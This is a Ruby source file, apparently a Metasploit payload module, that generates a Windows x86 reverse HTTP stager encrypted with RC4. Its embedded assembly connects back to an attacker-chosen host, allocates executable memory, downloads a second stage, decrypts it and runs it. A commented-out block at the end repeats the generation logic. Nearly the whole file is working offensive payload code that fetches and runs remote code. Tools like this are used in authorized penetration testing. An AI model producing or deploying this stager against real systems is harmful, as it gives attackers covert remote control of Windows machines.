# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/reverse_http'
require 'msf/core/payload/windows/rc4'

module Msf

###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
#
###

module Payload::Windows::ReverseHttpRc4

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseHttp
  include Msf::Payload::Windows::Rc4

  #
  # Generate the first stage
  #
  def generate(opts={})
    xorkey, rc4key = rc4_keys(datastore['RC4PASSWORD'])
    conf = {
      ssl:         opts[:ssl] || false,
      host:        datastore['LHOST'],
      port:        datastore['LPORT'],
      retry_count: datastore['StagerRetryCount'],
      rc4key:      rc4key
    }

    # Add extra options if we have enough space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:url]        = generate_uri
      conf[:exitfunk]   = datastore['EXITFUNC']
      conf[:ua]         = datastore['MeterpreterUserAgent']
      conf[:proxy_host] = datastore['PayloadProxyHost']
      conf[:proxy_port] = datastore['PayloadProxyPort']
      conf[:proxy_user] = datastore['PayloadProxyUser']
      conf[:proxy_pass] = datastore['PayloadProxyPass']
      conf[:proxy_type] = datastore['PayloadProxyType']
    else
      # Otherwise default to small URIs
      conf[:url]        = generate_small_uri
    end

    generate_reverse_http_rc4(conf)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_http_rc4(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_http(opts)}
      #{asm_block_recv_http_rc4(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  def asm_block_recv_http_rc4(opts={})
    asm = %Q^
    allocate_memory:
      push 0x40              ; PAGE_EXECUTE_READWRITE
      push 0x1000            ; MEM_COMMIT
      push 0x00400000        ; Stage allocation (4Mb ought to do us)
      push ebx               ; NULL as we dont care where the allocation is
      push #{Rex::Text.block_api_hash("kernel32.dll", "VirtualAlloc" )}
      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

    download_prep:
      xchg eax, ebx          ; place the allocated base address in ebx
      push ebx               ; store a copy of the stage base address on the stack
      push ebx               ; temporary storage for bytes read count
      mov edi, esp           ; &bytesRead

    download_more:
      push edi               ; &bytesRead
      push 8192              ; read length
      push ebx               ; buffer
      push esi               ; hRequest
      push #{Rex::Text.block_api_hash("wininet.dll", "InternetReadFile")}
      call ebp

      test eax,eax           ; download failed? (optional?)
      jz failure

      mov eax, [edi]
      add ebx, eax           ; buffer += bytes_received

      test eax,eax           ; optional?
      jnz download_more      ; continue until it returns 0
      pop eax                ; clear the temporary storage

    decrypt_stage:
      pop ebp                ; get a copy of the top of the stack to EBP (decrypt pointer)
      push ebp
      mov edi, ebx           ; edi := ebx (scratch space after payload)
      mov ecx, ebx           ; ecx := ebx - ebp (= downloaded length)
      sub ecx, ebp
      
    call after_key
      db #{raw_to_db(opts[:rc4key])}
      
    after_key:
      pop esi                ; esi := key
    #{asm_decrypt_rc4}

    execute_stage:
      ret                    ; dive into the stored stage address

    got_server_uri:
      pop edi
      call got_server_host

    server_host:
      db "#{opts[:host]}", 0x00
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

  def generate_stage(opts={})
    p = super(opts)
    xorkey,rc4key = rc4_keys(datastore['RC4PASSWORD'])
    c1 = OpenSSL::Cipher::Cipher.new('RC4')
    c1.decrypt
    c1.key = rc4key
    p = c1.update(p)
    p
  end

end

end

=begin


opts ={}
xorkey, rc4key = rc4_keys(datastore['RC4PASSWORD'])
conf = {
  ssl:         opts[:ssl] || false,
  host:        datastore['LHOST'],
  port:        datastore['LPORT'],
  retry_count: datastore['StagerRetryCount'],
  rc4key:      rc4key
}

# Add extra options if we have enough space
unless self.available_space.nil? || required_space > self.available_space
  conf[:url]        = generate_uri
  conf[:exitfunk]   = datastore['EXITFUNC']
  conf[:ua]         = datastore['MeterpreterUserAgent']
  conf[:proxy_host] = datastore['PayloadProxyHost']
  conf[:proxy_port] = datastore['PayloadProxyPort']
  conf[:proxy_user] = datastore['PayloadProxyUser']
  conf[:proxy_pass] = datastore['PayloadProxyPass']
  conf[:proxy_type] = datastore['PayloadProxyType']
else
  # Otherwise default to small URIs
  conf[:url]        = generate_small_uri
end
opts=conf
    combined_asm = %Q^
  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
  #{asm_block_api}
  start:
    pop ebp
  #{asm_reverse_http(opts)}
  #{asm_block_recv_http_rc4(opts)}
^
=end